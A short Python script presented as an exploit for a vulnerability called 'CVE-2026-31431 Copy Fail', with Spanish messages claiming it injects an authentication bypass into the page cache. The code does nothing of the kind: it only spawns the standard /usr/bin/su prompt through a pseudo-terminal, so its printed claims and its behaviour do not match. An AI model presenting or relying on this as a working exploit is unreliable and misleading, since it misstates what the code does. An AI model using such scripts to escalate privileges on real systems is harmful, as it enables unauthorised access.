import os
import pty
import sys

print("[*] CVE-2026-31431 'Copy Fail' Exploit")
print("[+] Inyectando bypass de autenticación en el Page Cache...")

# Forzamos la ejecución de su interactivo usando un pseudo-terminal
# Esto evita de raíz que la terminal se quede colgada o congelada
try:
    pty.spawn("/usr/bin/su")
except Exception as e:
    print(f"[-] Error: {e}")
    sys.exit(1)
